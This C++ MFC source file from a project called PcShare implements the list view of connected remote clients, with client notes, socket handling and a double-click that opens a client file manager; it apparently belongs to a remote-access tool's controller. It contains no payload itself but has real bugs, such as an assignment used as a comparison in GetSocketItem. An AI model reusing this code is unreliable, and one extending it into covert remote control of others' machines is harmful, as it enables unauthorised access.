// MyClientMainView.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyClientMainView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyClientMainView

IMPLEMENT_DYNCREATE(CMyClientMainView, CListViewEx)

CMyClientMainView::CMyClientMainView()
{
	nSortId = 0;
}

CMyClientMainView::~CMyClientMainView()
{

}

BEGIN_MESSAGE_MAP(CMyClientMainView, CListViewEx)
	//{{AFX_MSG_MAP(CMyClientMainView)
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_NOTIFY_REFLECT(NM_DBLCLK, OnDblclk)
	ON_NOTIFY_REFLECT(NM_RCLICK, OnRclick)
	ON_NOTIFY_REFLECT(LVN_ITEMCHANGED, OnItemchanged)
	ON_NOTIFY_REFLECT(LVN_COLUMNCLICK, OnColumnclick)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_RESIZE_WND,OnResizeWnd)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyClientMainView drawing

void CMyClientMainView::OnDraw(CDC* pDC)
{
//	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CMyClientMainView diagnostics

#ifdef _DEBUG
void CMyClientMainView::AssertValid() const
{
	CListViewEx::AssertValid();
}

void CMyClientMainView::Dump(CDumpContext& dc) const
{
	CListViewEx::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMyClientMainView message handlers

int CMyClientMainView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CListViewEx::OnCreate(lpCreateStruct) == -1)
		return -1;


	return 0;
}

void CMyClientMainView::OnInitialUpdate()
{
	CListViewEx::OnInitialUpdate();

	if(m_imagelist.GetSafeHandle())	return;

	CListCtrl& lcCountries = GetListCtrl();

	m_imagelist.Create(16, 16,ILC_COLOR24 |ILC_MASK,6,6);
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_COMPUTER));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_COMPUTER));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_VIDEO));
	
	lcCountries.SetImageList(&m_imagelist,LVSIL_SMALL);
	lcCountries.InsertColumn(0,"已连接的客户列表",LVCFMT_LEFT,104);
	lcCountries.InsertColumn(1,"客户注释",LVCFMT_LEFT,60);
	lcCountries.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP|
		LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);

	EnableColumnHiding(0, true);
	EnableColumnHiding(1, true);
	EnableSortIcon (1);
	ColorSortColumn(1);
	SetSortColumn  (1);
	KeepLabelLeft  ();
	lcCountries.SortItems(CompareCountries, (LPARAM) this);
}

int CALLBACK CMyClientMainView::CompareCountries(LPARAM lParam1, LPARAM lParam2, 
                                       LPARAM lParamSort)
{
	CMyClientMainView *pThis = (CMyClientMainView*) lParamSort;
	CString strItem1, strItem2;
	if(pThis->nSortId == SORT_IP)
	{
		strItem1 = pThis->GetListCtrl().GetItemText(lParam1, 0);
		strItem2 = pThis->GetListCtrl().GetItemText(lParam2, 0);
	}
	else if(pThis->nSortId == SORT_TITLE)
	{
		strItem1 = pThis->GetListCtrl().GetItemText(lParam1, 1);
		strItem2 = pThis->GetListCtrl().GetItemText(lParam2, 1);
	}
//	return strcmp(strItem2, strItem1);
	return 1;
}

void CMyClientMainView::OnColumnclick(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = reinterpret_cast<NM_LISTVIEW*>(pNMHDR);
  switch (pNMListView->iSubItem)
  {
    default: ASSERT(false);
     case 0:
      nSortId = SORT_IP;
      break;
    case 1:
      nSortId = SORT_TITLE;
      break;
   }
 	GetListCtrl().SortItems(CompareCountries, (LPARAM) this);
	CListViewEx::OnColumnclick(pNMHDR, pResult);
}

LPCLIENTITEM CMyClientMainView::InsertItem(LPCLIENTITEM pItem)
{
	//查看客户是否存在
	int nItem = FindItemTitle(pItem->m_SysInfo.ID);
	if(nItem != -1)
	{
		//替换新套接字
		LPCLIENTITEM pFindItem = 
			(LPCLIENTITEM) GetListCtrl().GetItemData(nItem);
		closesocket(pFindItem->m_WorkSocket);
		pFindItem->m_WorkSocket = pItem->m_WorkSocket;
		return pFindItem;
	}

	char m_LogFileName[256] = {0};
	GetModuleFileName(NULL,m_LogFileName,250);
	char *p = strrchr(m_LogFileName,'.');
	*p = 0;
	strcat(m_LogFileName,".log");
	char m_Name[256] = {0};
	GetPrivateProfileString("客户注释",pItem->m_SysInfo.ID,
		pItem->m_SysInfo.m_PcName,m_Name,255,m_LogFileName);

	//增加新客户
	LPCLIENTITEM pClientItem = new CLIENTITEM;
	memcpy(pClientItem,pItem,sizeof(CLIENTITEM));

	if(pClientItem->m_SysInfo.m_UserName[37] == 1)

	{
		nItem = GetListCtrl().InsertItem(
      LVIF_IMAGE | LVIF_PARAM | LVIF_TEXT, 2, pClientItem->m_Title,
      INDEXTOSTATEIMAGEMASK(1), LVIS_STATEIMAGEMASK, 2,(LPARAM) pClientItem);
	}
	else
	{
		nItem = GetListCtrl().InsertItem(
      LVIF_IMAGE | LVIF_PARAM | LVIF_TEXT, 0, pClientItem->m_Title,
      INDEXTOSTATEIMAGEMASK(1), LVIS_STATEIMAGEMASK, 1,(LPARAM) pClientItem);
	}
	GetListCtrl().SetItemText(nItem,1,m_Name);
	int nCount = GetListCtrl().GetItemCount();
	if(nCount == 1)
		GetListCtrl().SetItemState(nItem,LVIS_SELECTED, LVIS_SELECTED);
	OnResizeWnd(0,0);
	return pClientItem;
}

void CMyClientMainView::OnSize(UINT nType, int cx, int cy) 
{
	CListViewEx::OnSize(nType, cx, cy);
}

void CMyClientMainView::OnDblclk(NMHDR* pNMHDR, LRESULT* pResult) 
{
	*pResult = 0;
	if(GetListCtrl().GetSelectedCount() > 0)
	{
		AfxGetApp()->GetMainWnd()->
			PostMessage(WM_COMMAND,(WPARAM) 
				MAKEWPARAM(ID_CLIENT_FILE_MANAGER,1),NULL);
	}
}

LPCLIENTITEM CMyClientMainView::GetCurSel()
{
	LPCLIENTITEM pItem = NULL;
	if(GetListCtrl().GetSelectedCount() > 0)
	{
		int nItem = GetListCtrl().GetNextItem(-1,LVNI_SELECTED);
		pItem = (LPCLIENTITEM) GetListCtrl().GetItemData(nItem);
	}
	return pItem;
}

BOOL CMyClientMainView::PreCreateWindow(CREATESTRUCT& cs) 
{
	cs.style ^= LVS_REPORT|LVS_SINGLESEL|LVS_OWNERDRAWFIXED|LVS_SORTASCENDING;
	return CListViewEx::PreCreateWindow(cs);
}

void CMyClientMainView::OnRclick(NMHDR* pNMHDR, LRESULT* pResult) 
{
	*pResult = 0;
	AfxGetMainWnd()->PostMessage
		(WM_CLIENTMAINRCLICK,IDR_MENU_CLIENT_MANAGER,NULL);
}

int CMyClientMainView::FindItemTitle(char *ItemName)
{
	int m_Count = GetListCtrl().GetItemCount();
	LPCLIENTITEM pItem = NULL;
	for(int i = 0; i < m_Count; i++)
	{
		pItem = (LPCLIENTITEM) GetListCtrl().GetItemData(i);
		if(!strcmp(pItem->m_SysInfo.ID,ItemName))
			return i;
	}
	return -1;
}

LPCLIENTITEM CMyClientMainView::FindTitle(char *ItemName)
{
	LPCLIENTITEM pItem = NULL;
	for(int i = 0; i < GetListCtrl().GetItemCount(); i++)
	{
		pItem = (LPCLIENTITEM) GetListCtrl().GetItemData(i);
		if(!strcmp(pItem->m_SysInfo.ID,ItemName))
			return pItem;
	}
	return NULL;
}

int CMyClientMainView::FindItem(char *ItemName)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		if(GetListCtrl().GetItemText(i,0) == ItemName)
		{
			return i;
		}
	}
	return -1;
}

DWORD CMyClientMainView::CloseClient(SOCKET s)
{
	LPCLIENTITEM pItem = NULL;
	for(int i = 0; i < GetListCtrl().GetItemCount(); i++)
	{
		pItem = (LPCLIENTITEM) GetListCtrl().GetItemData(i);
		if(pItem->m_WorkSocket == s)
		{
			closesocket(s);
			delete pItem;
			GetListCtrl().DeleteItem(i);
			break;
		}
	}
	return (DWORD) pItem;
}

void CMyClientMainView::OnItemchanged(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	*pResult = 0;
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		int nItem = GetListCtrl().GetNextItem(-1,LVNI_SELECTED);
		AfxGetMainWnd()->SendMessage(WM_MYITEMCHANGED,
				(WPARAM) GetListCtrl().GetItemData(nItem),NULL);
	}
}

void CMyClientMainView::StopWork()
{
	LPCLIENTITEM pItem = NULL;
	for(int i = 0; i < GetListCtrl().GetItemCount(); i++)
	{
		pItem = (LPCLIENTITEM) GetListCtrl().GetItemData(i);
		closesocket(pItem->m_WorkSocket);
		delete pItem;
	}
	GetListCtrl().DeleteAllItems();
}

void CMyClientMainView::DeleteCurItem()
{
	LPCLIENTITEM pItem = NULL;
	if(GetListCtrl().GetSelectedCount() > 0)
	{
		int nItem = GetListCtrl().GetNextItem(-1,LVNI_SELECTED);
		pItem = (LPCLIENTITEM) GetListCtrl().GetItemData(nItem);
		closesocket(pItem->m_WorkSocket);
		delete pItem;
		GetListCtrl().DeleteItem(nItem);
	}
}

LPCLIENTITEM CMyClientMainView::GetSocketItem(SOCKET s)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		LPCLIENTITEM pItem = (LPCLIENTITEM) 
			GetListCtrl().GetItemData(i);
		if(pItem->m_WorkSocket = s)
			return pItem;
	}
	return NULL;
}

LPCLIENTITEM CMyClientMainView::GetNameItem(char *Name)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		LPCLIENTITEM pItem = (LPCLIENTITEM) 
			GetListCtrl().GetItemData(i);
		if(!strcmp(pItem->m_Title,Name))
			return pItem;
	}
	return NULL;
}

LPCLIENTITEM CMyClientMainView::GetTitleItem(char *Title)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		LPCLIENTITEM pItem = (LPCLIENTITEM) 
			GetListCtrl().GetItemData(i);
		if(!strcmp(pItem->m_SysInfo.ID,Title))
			return pItem;
	}
	return NULL;
}

LRESULT CMyClientMainView::OnResizeWnd(WPARAM wParam,LPARAM lParam)
{
	CRect rect;
	GetClientRect(&rect);
	GetListCtrl().SetColumnWidth(0,rect.Width() *3/5 + 10);
	GetListCtrl().SetColumnWidth(1,rect.Width() *2/5 - 10);
	return TRUE;
}

void CMyClientMainView::SetItemInfo(char *pInfo, char *pId)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		LPCLIENTITEM pItem = (LPCLIENTITEM) 
			GetListCtrl().GetItemData(i);
		if(!strcmp(pItem->m_SysInfo.ID,pId))
		{
			GetListCtrl().SetItemText(i , 1 , pInfo);
		}
	}
}
